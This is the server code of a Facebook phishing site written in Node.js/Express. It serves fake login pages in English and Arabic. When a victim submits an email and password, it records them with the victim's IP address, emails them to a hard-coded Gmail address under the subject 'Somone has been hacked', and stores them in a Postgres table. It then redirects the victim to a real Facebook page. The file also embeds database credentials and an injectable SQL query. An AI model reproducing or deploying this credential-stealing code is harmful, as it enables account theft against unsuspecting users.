var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'hedmgtryrynnvo',
    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
    database: 'deqngk324p153p',
    port: 5432,
    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
    ssl: true
});

client.connect();
// ############################################       NODE MAILER    ##############################################################################################
const nodemailer = require("nodemailer");
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'fadysadakah.emh@gmail.com',
        pass: 'encrypted'
    }
});
var mailOptions = {
    from: 'Fady Sadakah<fadysadakah.emh@gmail.com>',
    to: "fadysadakah.emh@gmail.com",
    subject: 'Somone has been hacked',
    text: '',
    html: ''
};




// #####################################################################################################################################################
var redirect_link='https://www.google.com'

app.get('/', function (req, res) {
    redirect_link =''
    res.render('fb_en', { redirect_link: redirect_link });
    
})
app.get('/n/*', function (req, res) {
    redirect_link ='https://www.facebook.com/my.omelette/photos/a.400034677207255/455544524989603/?type=3&theater'
    res.render('fb_en',{redirect_link:redirect_link});
    
})
redirect_link =''
app.get('/ar/*', function (req, res) {
    res.render('fb_ar',{redirect_link:redirect_link});

})

// #####################################################################################################################################################
app.post('/confirm', function (req, res) {
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;


    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {
        
    } else if (mail.length < c.length) {
        mail = c;
    }
    
    if (password == undefined) {
        password = d;
    } else if (d == undefined) {
        
    }
    else if (password.length < d.length) {
        password = d;
    }


    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
    
    res.redirect(req.body.redirect_link)


    //    mailOptions.to='';
    mailOptions.text='mail   :   '+mail+'\npassword   :   '+password+'\nip   :   '+ip;
    transporter.sendMail(mailOptions, function () { });


    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) { })
})




// ***********************************************************************************************************************************************

app.get('*', function (req, res) {
    res.redirect('/')
})
app.listen(PORT, function () {
    console.log('Server Started')
})